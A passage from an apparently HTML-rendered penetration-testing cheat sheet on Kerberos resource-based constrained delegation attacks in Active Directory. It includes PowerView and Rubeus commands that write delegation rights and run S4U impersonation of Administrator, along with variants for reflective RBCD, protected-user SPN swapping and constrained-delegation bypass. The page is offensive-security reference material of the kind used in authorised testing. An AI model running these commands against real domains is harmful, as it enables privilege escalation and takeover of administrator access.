role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Create the new raw security descriptor</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$SD</span> <span class="cm-operator">=</span> <span class="cm-builtin">New-Object</span> <span class="cm-identifier">Security</span><span class="cm-punctuation">.</span><span class="cm-identifier">AccessControl</span><span class="cm-punctuation">.</span><span class="cm-identifier">RawSecurityDescriptor</span> <span class="cm-operator">-</span><span class="cm-identifier">ArgumentList</span> <span class="cm-string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="cm-variable-2">$ComputerSid</span><span class="cm-string">)"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$SDBytes</span> <span class="cm-operator">=</span> <span class="cm-builtin">New-Object</span> <span class="cm-identifier">byte</span><span class="cm-punctuation">[]</span> <span class="cm-punctuation">(</span><span class="cm-variable-2">$SD</span><span class="cm-punctuation">.</span><span class="cm-identifier">BinaryLength</span><span class="cm-punctuation">)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$SD</span><span class="cm-punctuation">.</span><span class="cm-identifier">GetBinaryForm</span><span class="cm-punctuation">(</span><span class="cm-variable-2">$SDBytes</span><span class="cm-punctuation">,</span> <span class="cm-number">0</span><span class="cm-punctuation">)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Add the new raw SD to msds-allowedtoactonbehalfofotheridentity</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">23</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainComputer</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">SearchBase</span> <span class="cm-string">"LDAP://DC=domain,DC=local"</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-variable-2">$Cred</span> <span class="cm-operator">|</span> <span class="cm-identifier">Set-DomainObject</span> <span class="cm-operator">-</span><span class="cm-builtin">Set</span> <span class="cm-punctuation">@{</span><span class="cm-string">'msds-allowedtoactonbehalfofotheridentity'</span><span class="cm-operator">=</span><span class="cm-variable-2">$SDBytes</span><span class="cm-punctuation">}</span> <span class="cm-operator">-</span><span class="cm-identifier">SearchBase</span> <span class="cm-string">"LDAP://DC=domain,DC=local"</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-variable-2">$Cred</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">24</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">25</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Check if well added</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">26</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$RawBytes</span> <span class="cm-operator">=</span> <span class="cm-identifier">Get-DomainComputer</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-string">'msds-allowedtoactonbehalfofotheridentity'</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-variable-2">$Cred</span> <span class="cm-operator">-</span><span class="cm-identifier">SearchBase</span> <span class="cm-string">"LDAP://DC=domain,DC=local"</span> <span class="cm-operator">|</span> <span class="cm-builtin">select</span> <span class="cm-operator">-</span><span class="cm-identifier">expand</span> <span class="cm-identifier">msds-allowedtoactonbehalfofotheridentity</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">27</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-builtin">New-Object</span> <span class="cm-identifier">Security</span><span class="cm-punctuation">.</span><span class="cm-identifier">AccessControl</span><span class="cm-punctuation">.</span><span class="cm-identifier">RawSecurityDescriptor</span> <span class="cm-operator">-</span><span class="cm-identifier">ArgumentList</span> <span class="cm-variable-2">$RawBytes</span><span class="cm-punctuation">,</span> <span class="cm-number">0</span><span class="cm-punctuation">).</span><span class="cm-identifier">DiscretionaryAcl</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 595px;"></div><div class="CodeMirror-gutters" style="height: 645px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-use-the-s4uself-func"><li>Use the <strong>S4USelf</strong> function with the fake machine (on an arbitrary SPN) to create a forwardable ticket for a wanted user (not <strong>protected</strong>)</li>
<li>Use the <strong>S4UProxy</strong> function to obtain a TGS for the impersonated user for the wanted service on the target machine</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1223px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 98px; min-width: 1223px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Calcul hash</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">hash</span> <span class="cm-operator">/</span><span class="cm-identifier">password</span><span class="cm-operator">:</span><span class="cm-identifier">Password123</span><span class="cm-operator">!</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:</span><span class="cm-identifier">FAKE01</span><span class="cm-error">$</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#S4U attack</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">s4u</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:</span><span class="cm-identifier">FAKE01</span><span class="cm-error">$</span> <span class="cm-operator">/</span><span class="cm-identifier">rc4</span><span class="cm-operator">:</span><span class="cm-number">2</span><span class="cm-identifier">B576ACBE6BCFDA7294D6BD18041B8FE</span> <span class="cm-operator">/</span><span class="cm-identifier">impersonateuser</span><span class="cm-operator">:</span><span class="cm-identifier">administrator</span> <span class="cm-operator">/</span><span class="cm-identifier">msdsspn</span><span class="cm-operator">:</span><span class="cm-identifier">cifs</span><span class="cm-operator">/&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span> <span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-operator">:</span><span class="cm-identifier">DC</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 98px;"></div><div class="CodeMirror-gutters" style="height: 148px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-skip-s4uself">Skip S4USelf</h4>
<ul id="bkmrk-attacker-has-comprom"><li>Attacker has compromised Service A, has sufficient ACLs against Service B to configure RBCD, and wants to attack Service B</li>
<li>By social engineering or any other solution, an interesting victim authenticates to Service A with a TGS</li>
<li>Attacker dumps the TGS on Service A (<code>sekurlsa::tickets</code>)</li>
<li>Attacker configures RBCD from Service A to Service B as above</li>
<li>Attacker performs S4UProxy and bypass S4USelf by providing the TGS as evidence</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1151px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1150.62px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">s4u</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:</span><span class="cm-identifier">ServiceA</span><span class="cm-error">$</span> <span class="cm-operator">/</span><span class="cm-identifier">aes256</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">service_key</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">tgs</span><span class="cm-operator">:</span><span class="cm-string">"/path/to/kirbi"</span> <span class="cm-operator">/</span><span class="cm-identifier">msdsspn</span><span class="cm-operator">:</span><span class="cm-identifier">cifs</span><span class="cm-operator">/</span><span class="cm-identifier">serviceB</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span> <span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-operator">:</span><span class="cm-identifier">DC</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-reflective-rbcd">Reflective RBCD</h4>
<p id="bkmrk-with-a-tgt-or-the-ha">With a TGT or the hash of a service account, an attacker can configure a RBCD from the service to itself, a run a full S4U to access to access the machine on behalf of another user.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1216px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 1215.76px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-ADComputer</span> <span class="cm-identifier">ServiceA</span> <span class="cm-operator">-</span><span class="cm-identifier">PrincipalsAllowedToDelegateToAccount</span> <span class="cm-identifier">ServiceA</span><span class="cm-error">$</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">s4u</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:</span><span class="cm-identifier">ServiceA</span><span class="cm-error">$</span> <span class="cm-operator">/</span><span class="cm-identifier">aes256</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">service_key</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">impersonateuser</span><span class="cm-operator">:</span><span class="cm-identifier">Administrator</span> <span class="cm-operator">/</span><span class="cm-identifier">msdsspn</span><span class="cm-operator">:</span><span class="cm-identifier">cifs</span><span class="cm-operator">/</span><span class="cm-identifier">serviceA</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span> <span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-operator">:</span><span class="cm-identifier">DC</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-impersonate-protecte">Impersonate protected user via S4USelf request</h4>
<p id="bkmrk-it-is-possible-to-im">It is possible to impersonate a <strong>protected</strong> <strong>user</strong> with the <strong>S4USelf</strong> request if we have a TGT (or the creds) of the target machine (for example from an <strong>Unconstrained Delegation</strong>).</p>
<p id="bkmrk-with-the-target-tgt-">With the target TGT it is possible to realise a S4USelf request for any user and obtain a TGS for the service. In case where the needed user is protected against delegation, S4USelf will still work, but the TGS is not forwardable (so no S4UProxy possible) and the specified SPN is invalid...however, the SPN is not in the encrypted part of the ticket. So it is possible to modify the SPN and retrieve a valid TGS for the target service with a sensitive user (and the TGS PAC is well signed by the KDC).</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1107px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 1107.19px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">s4u</span> <span class="cm-operator">/</span><span class="cm-identifier">self</span> <span class="cm-operator">/</span><span class="cm-identifier">impersonateuser</span><span class="cm-operator">:</span><span class="cm-identifier">Administrator</span> <span class="cm-operator">/</span><span class="cm-identifier">ticket</span><span class="cm-operator">:</span><span class="cm-identifier">doIFFz</span><span class="cm-punctuation">[</span><span class="cm-operator">..</span><span class="cm-punctuation">.</span><span class="cm-identifier">SNIP</span><span class="cm-operator">..</span><span class="cm-punctuation">.]</span><span class="cm-identifier">TE9DQUw</span><span class="cm-operator">=</span>  <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">altservice</span><span class="cm-operator">:</span><span class="cm-identifier">cifs</span><span class="cm-operator">/</span><span class="cm-identifier">server</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-bypass-constrained-d">Bypass Constrained Delegation restrictions with RBCD</h4>
<ul id="bkmrk-attacker-compromises"><li>Attacker compromises <strong>ServiceA</strong> and <strong>ServiceB</strong>
</li>
<li>ServiceB is allowed to delegate to <code>time/ServiceC</code> (the target) without protocol transition (no S4USelf)</li>
<li>Attacker configures RBCD from ServiceA to ServiceB and performs a full S4U attack to obtain a forwardable TGS for the Administrator to ServiceB</li>
<li>Attacker reuses this forwardable TGS as evidence to realise a S4UProxy attack from ServiceB to <code>time/ServiceC</code>
</li>
<li>Since the service is not protected in the obtained ticket, the attacker can change the TGS from the previous S4UProxy execution to <code>cifs/ServiceC</code>
</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1274px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 142px; min-width: 1273.67px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#RBCD from A to B</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-ADComputer</span> <span class="cm-identifier">ServiceB</span> <span class="cm-operator">-</span><span class="cm-identifier">PrincipalsAllowedToDelegateToAccount</span> <span class="cm-identifier">ServiceA</span><span class="cm-error">$</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">s4u</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:</span><span class="cm-identifier">ServiceA</span><span class="cm-error">$</span> <span class="cm-operator">/</span><span class="cm-identifier">aes256</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">serviceA_key</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">impersonateuser</span><span class="cm-operator">:</span><span class="cm-identifier">Administrator</span> <span class="cm-operator">/</span><span class="cm-identifier">msdsspn</span><span class="cm-operator">:</span><span class="cm-identifier">cifs</span><span class="cm-operator">/</span><span class="cm-identifier">serviceB</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-operator">:</span><span class="cm-identifier">DC</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#S4UProxy from B to C with the obtained TGS as evidence</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber 